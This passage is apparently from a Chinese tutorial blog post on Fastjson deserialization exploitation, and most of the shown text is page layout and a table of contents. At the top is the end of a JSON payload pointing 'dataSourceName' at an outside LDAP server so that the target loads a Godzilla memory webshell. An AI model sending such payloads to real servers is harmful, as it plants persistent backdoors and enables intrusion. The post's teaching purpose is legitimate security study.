<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.72.129:1389/Basic/GodzillaMemshell&quot;</span>,</span><br><span class="line">		<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>默认密码为:<br><img src="https://s2.loli.net/2024/06/05/C2bDF8pAYUa3mRI.png" alt="image-20240605005944688"></p>
+<p><img src="https://s2.loli.net/2024/06/05/Wf3OxMoG4iJmZ9F.png" alt="image-20240605010350627"></p>
+<p><img src="https://s2.loli.net/2024/06/05/4WcNJ7tzADobg8Q.png" alt="image-20240605010423860"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://RuiJiLuo.github.io">Rui Ji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ruijiluo.github.io/2024/06/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://ruijiluo.github.io/2024/06/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://RuiJiLuo.github.io" target="_blank">RJ の 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/">web漏洞进阶</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/06/03/Id1YvTSnFuaXW89.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/01/javaWeb/" title="常见开源系统漏洞"><img class="cover" src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">常见开源系统漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/01/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/" title="Shiro反序列漏洞"><img class="cover" src="https://s2.loli.net/2024/06/01/mRFe341Vp2ovYs9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Shiro反序列漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/01/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/" title="Shiro反序列漏洞"><img class="cover" src="https://s2.loli.net/2024/06/01/mRFe341Vp2ovYs9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-01</div><div class="title">Shiro反序列漏洞</div></div></a></div><div><a href="/2024/06/01/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="java反序列化漏洞"><img class="cover" src="https://s2.loli.net/2024/06/01/EZbrN4qCt5ezH1X.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-01</div><div class="title">java反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rui Ji</div><div class="author-info__description">私 の hacker 夢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ruijiluo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">Fastjson反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">1.漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Fastjson%E3%80%81RMI%E5%92%8CJNDI%E4%BB%8B%E7%BB%8D"><span class="toc-text">1.Fastjson、RMI和JNDI介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-text">2.原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">2.漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%95%B8%E5%BD%A2%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8E%A2%E6%B5%8B"><span class="toc-text">1.畸形数据包探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-dnslog%E5%A4%96%E5%B8%A6-%E5%B8%B8%E7%94%A8"><span class="toc-text">2.dnslog外带(常用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%BB%B6%E6%97%B6payload%E6%8E%A2%E6%B5%8B"><span class="toc-text">3.延时payload探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">3.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%8B%E5%B7%A5%E5%88%A9%E7%94%A8"><span class="toc-text">1.手工利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">1.1 命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.2 反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-text">2.工具利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.1 反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">1.2 内存马注入</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/pwn/" title="pwn"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn"/></a><div class="content"><a class="title" href="/2024/11/14/pwn/" title="pwn">pwn</a><time datetime="2024-11-14T09:15:12.000Z" title="发表于 2024-11-14 17:15:12">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="app渗透"/></a><div class="content"><a class="title" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透">app渗透</a><time datetime="2024-09-12T11:35:21.000Z" title="发表于 2024-09-12 19:35:21">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透"/></a><div class="content"><a class="title" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透</a><time datetime="2024-09-12T11:32:28.000Z" title="发表于 2024-09-12 19:32:28">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="代码审计"/></a><div class="content"><a class="title" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a><time datetime="2024-09-12T11:31:50.000Z" title="发表于 2024-09-12 19:31:50">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js逆向"/></a><div class="content"><a class="title" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向">js逆向</a><time datetime="2024-09-12T11:31:20.000Z" title="发表于 2024-09-12 19:31:20">2024-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Rui Ji</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
